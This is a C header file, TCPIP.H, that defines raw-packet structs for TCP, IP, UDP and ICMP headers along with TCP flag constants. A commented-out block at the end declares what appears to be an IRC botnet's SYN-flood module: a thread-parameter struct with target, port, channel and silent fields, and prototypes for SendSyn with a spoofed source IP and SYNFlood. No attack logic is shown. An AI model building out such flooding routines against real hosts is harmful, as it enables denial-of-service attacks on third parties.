/*************************** TCPIP.H ********************************/
#ifndef _TCPIP_H_
#define _TCPIP_H_

#define IP_HDRINCL  2 

// Standard TCP flags
#define URG 0x20
#define ACK 0x10
#define PSH 0x08
#define RST 0x04
#define SYN 0x02
#define FIN 0x01

// Our tcp header struct
typedef struct tcphdr {

	unsigned short sport;			// Source port
	unsigned short dport;			// Destination port
	unsigned int   seq;				// Sequence number
	unsigned int   ack_seq;			// Acknowledgement number
	unsigned char  lenres;			// Length return size
	unsigned char  flags;			// Flags and header length
	unsigned short window;			// Window size
	unsigned short checksum;		// Packet Checksum
	unsigned short urg_ptr;			// Urgent Pointer

} TCPHEADER;

// Our tcp header struct
typedef struct tcphdr2 {

	unsigned short source;			// Source port
	unsigned short dest;			// Destination port
	unsigned int   seq;				// Sequence number
	unsigned int   ack_seq;			// Acknowledgement number
	unsigned short res1;
	unsigned short doff;
	unsigned short fin;
	unsigned short syn;
	unsigned short rst;
	unsigned short psh;
	unsigned short ack;
	unsigned short urg;
	unsigned short res2;
	unsigned short window;			// Window size
	unsigned short check;			// Packet Checksum
	unsigned short urg_ptr;			// Urgent Pointer

} TCPHEADER2;

// Our ip header struct
typedef struct iphdr {

	unsigned char  verlen;			// IP version & length
	//unsigned int   h_len:4;		// Length of the header
	//unsigned int   version:4;		// Version of IP
	unsigned char  tos;				// Type of service
	unsigned short total_len;		// Total length of the packet
	unsigned short ident;			// Unique identifier
	unsigned short frag_and_flags;	// Flags
	unsigned char  ttl;				// Time to live
	unsigned char  proto;			// Protocol (TCP, UDP etc)
	unsigned short checksum;		// IP checksum
	unsigned int   sourceIP;		// Source IP
	unsigned int   destIP;			// Destination IP

} IPHEADER;

// Our pseudo header struct
typedef struct pshdr {

	unsigned int   saddr;			// Source address
	unsigned int   daddr;			// Destination address
	unsigned char  zero;			// Placeholder
	unsigned char  proto;			// Protocol
	unsigned short length;			// TCP length
	struct tcphdr tcp;				// TCP Header struct

} PSDHEADER;

// Our udp header struct
typedef struct udphdr {

	unsigned short source;			// Source port
	unsigned short dest;			// Destination port
    unsigned short length;			// Packet length
    unsigned short checksum;		// Packet checksum

} UDPHEADER;
        
// Our icmp header struct
typedef struct icmphdr {

	unsigned char  type;			// Type of ICMP packet
    unsigned char  subcode;			// Subcode of type of packet
    unsigned short checksum;		// Packet checksum
	unsigned short id;				// ID number
	unsigned short seq;				// Sequence number

} ICMPHEADER;

#endif

//*****************************************************************//
/*
#ifndef NO_SYN 
#define IP_HDRINCL  2 
 
typedef struct ip_hdr 
{  
	unsigned char h_verlen; 
    unsigned char tos; 
    unsigned short total_len; 
    unsigned short ident; 
    unsigned short frag_and_flags; 
    unsigned char ttl; 
    unsigned char proto; 
    unsigned short checksum; 
    unsigned int sourceIP; 
    unsigned int destIP; 
} IPHEADER; 

typedef struct tsd_hdr 
{  
	unsigned long saddr; 
    unsigned long daddr; 
    char mbz; 
    char ptcl; 
    unsigned short tcpl; 
} PSDHEADER; 
 
typedef struct tcp_hdr 
{  
	USHORT th_sport; 
    USHORT th_dport; 
    unsigned int th_seq; 
    unsigned int th_ack; 
    unsigned char th_lenres; 
    unsigned char th_flag; 
    USHORT th_win; 
    USHORT th_sum; 
    USHORT th_urp; 
} TCPHEADER;

typedef struct synt 
{
	char ip[128];
	char port[128];
	char length[128];
	char chan[128];
	BOOL notice;
	BOOL silent;
	int threadnum;
	SOCKET socket;
} synt;

DWORD WINAPI synthread(LPVOID param);
long SendSyn(unsigned long TargetIP, unsigned int SpoofingIP, unsigned short TargetPort,int Times);
long SYNFlood(char *target, char *port, char *len);
#endif*/

/********************** END TCPIP.H *************************************/